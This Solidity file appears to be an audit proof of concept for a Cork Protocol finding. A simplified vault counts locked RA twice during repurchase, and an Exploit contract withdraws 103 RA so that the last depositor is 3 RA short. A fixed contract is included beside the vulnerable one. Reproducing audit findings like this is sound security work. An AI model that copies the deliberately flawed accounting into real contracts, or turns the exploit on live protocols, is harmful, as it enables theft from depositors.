// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cork Protocol — H-7 (Sherlock 2024-08, issue 155)
    repurchase lockUnchecked's the RA the buyer just sent, then
    unsafeIssueToLv incLocked's the fee slice a second time when it mints
    CT+DS. Locked RA becomes 1103 while the contract holds 1100. The buyer
    withdraws 103 and the last depositor is short 3 RA.
*/

contract RaToken {
    string public symbol = "RA";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Psm {
    RaToken public ra;
    uint256 public locked;
    mapping(address => uint256) public credit;
    address public victim;

    constructor(RaToken ra_, address victim_) {
        ra = ra_;
        victim = victim_;
    }

    function seed(address user, uint256 amount) external {
        credit[user] = amount;
        locked = amount;
    }

    function repurchase(uint256 amount) external {
        uint256 fee = amount * 5 / 100;
        require(fee == 5 ether, "fee");
        require(ra.transferFrom(msg.sender, address(this), amount), "pull");
        // transfer user RA to the PSM. Sponsor: this should be lockFrom, not lockUnchecked.
        lockUnchecked(amount, msg.sender);
        uint256 raUsedToMint = 3 ether;
        unsafeIssueToLv(raUsedToMint);
    }

    function lockUnchecked(uint256 amount, address buyer) internal {
        locked += amount;
        credit[buyer] += amount;
    }

    function unsafeIssueToLv(uint256 amount) internal {
        // @> VULN: incLocked adds the CT mint on top of RA that lockUnchecked already counted
        locked += amount;
        credit[msg.sender] += amount;
    }

    function redeem(address user) external returns (uint256 amount) {
        amount = credit[user];
        credit[user] = 0;
        require(ra.transfer(user, amount), "short");
    }
}

contract PsmFixed {
    RaToken public ra;
    uint256 public locked;
    mapping(address => uint256) public credit;

    constructor(RaToken ra_) {
        ra = ra_;
    }

    function seed(address user, uint256 amount) external {
        credit[user] = amount;
        locked = amount;
    }

    function repurchase(uint256 amount) external {
        require(ra.transferFrom(msg.sender, address(this), amount), "pull");
        locked += amount;
        credit[msg.sender] += amount;
        // Fee RA used to mint CT is already inside `amount`. Do not incLocked again.
    }

    function redeem(address user) external returns (uint256 amount) {
        amount = credit[user];
        credit[user] = 0;
        require(ra.transfer(user, amount), "pay");
    }
}

contract Exploit {
    RaToken public ra;
    Psm public psm;
    address public victim;
    uint256 public withdrawn;
    uint256 public shortfall;

    constructor() {
        ra = new RaToken();
        victim = address(0xBEEF);
        psm = new Psm(ra, victim);
        ra.mint(address(psm), 1000 ether);
        ra.mint(address(this), 100 ether);
        psm.seed(victim, 1000 ether);
        ra.approve(address(psm), type(uint256).max);
    }

    function run() external {
        psm.repurchase(100 ether);
        require(psm.locked() == 1103 ether, "locked");
        require(ra.balanceOf(address(psm)) == 1100 ether, "cash");
        withdrawn = psm.redeem(address(this));
        shortfall = 1000 ether - ra.balanceOf(address(psm));
        require(withdrawn == 103 ether, "withdrew");
        require(shortfall == 3 ether, "victim short");
        require(ra.balanceOf(address(this)) == 103 ether, "balance");
        require(psm.credit(victim) == 1000 ether, "victim still owed");
    }
}
